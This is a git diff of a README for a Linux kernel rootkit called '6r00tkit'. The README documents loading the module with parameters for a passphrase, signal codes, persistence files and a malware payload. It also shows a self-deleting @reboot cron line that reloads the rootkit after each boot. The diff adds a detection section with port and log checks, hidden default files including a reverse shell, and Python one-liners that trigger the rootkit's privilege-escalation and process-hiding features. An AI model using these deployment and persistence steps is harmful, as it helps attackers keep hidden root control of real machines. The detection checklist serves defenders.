@@ -38,7 +38,7 @@ sudo insmod ./6r00tkit.ko
 ### Add parameters
 
 ```bash
-sudo insmod ./6r00tkit.ko modulename="other_rootkit" passphrase="s3cr3t" killcode=666 rootkitdirectory="/rootkit/directory" rootkitfile="rootkit.ko" persistencedirectory="/persistence/directory" persistencefile="mycron" malwarefile="my_malware_filename.malware"
+sudo insmod ./6r00tkit.ko modulename="other_rootkit" passphrase="s3cr3t" processsignal=666 rootkitdirectory="/rootkit/directory" rootkitfile="rootkit.ko" persistencedirectory="/persistence/directory" persistencefile="mycron" malwarefile="my_malware_filename.malware" ipsignal=600613
 ```
 
 ## Usages
@@ -69,6 +69,20 @@ You can reload the kernel module on reboot with a single cronjob, write the foll
 ```cron
 @reboot root /bin/bash -c 'echo "/bin/sleep 10; /sbin/insmod /path/to/6r00tkit.ko" > /tmp/.placeholder; /bin/bash /tmp/.placeholder; /bin/rm -f /tmp/.placeholder'
 ```
+
+## 6r00tkit detection
+
+ 1. Use `tcpdump` to see all connections opens
+ 2. Check on your firewall logs all recent ports used
+ 3. Use `netstat -a` and/or `sudo ss -atnp4` to see ports
+ 4. Compare used ports on firewall and tcpdump with *listening* and *established* connections on your host
+ 5. Try to edit default files (don't list directory with `ls` theses files are hidden):
+     - `/etc/cron.d/6r00tkit`
+     - `/root/6r00tkit.ko`
+     - `/root/reverseshell`
+ 6. Try to use features with default passphrase and codes
+     - `python3 -c 'from os import getuid, mkdir;i=getuid();mkdir("1 4m 6r00t");print("6r00tkit detected" if i and not getuid() else "6r00tkit not detected")'`
+     - `python3 -c 'from os import getpid, kill, listdir;kill(getpid(), 14600);print("6r00tkit detected" if str(getpid) not in listdir("/proc") else "6r00tkit not detected")'`
 
 ## Licence
 
